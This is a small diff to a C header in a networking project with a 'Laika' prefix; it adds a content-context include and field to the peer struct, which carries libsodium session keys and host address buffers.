@@ -6,6 +6,7 @@
 #include "lpacket.h"
 #include "lpolllist.h"
 #include "lsodium.h"
+#include "lcontent.h"
 
 typedef enum {
     PEER_UNKNWN,
@@ -30,7 +31,6 @@ typedef enum {
 # endif
 #endif
 
-struct sLaika_peer;
 typedef void (*PeerPktHandler)(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
 
 struct sLaika_peerPacketInfo {
@@ -43,6 +43,7 @@ struct sLaika_peerPacketInfo {
 
 struct sLaika_peer {
     struct sLaika_socket sock; /* DO NOT MOVE THIS. this member HAS TO BE FIRST so that typecasting sLaika_peer* to sLaika_sock* works as intended */
+    struct sLaika_contentContext context;
     uint8_t peerPub[crypto_kx_PUBLICKEYBYTES]; /* connected peer's public key */
     uint8_t inKey[crypto_kx_SESSIONKEYBYTES], outKey[crypto_kx_SESSIONKEYBYTES];
     char hostname[LAIKA_HOSTNAME_LEN], inet[LAIKA_INET_LEN], ipv4[LAIKA_IPV4_LEN];
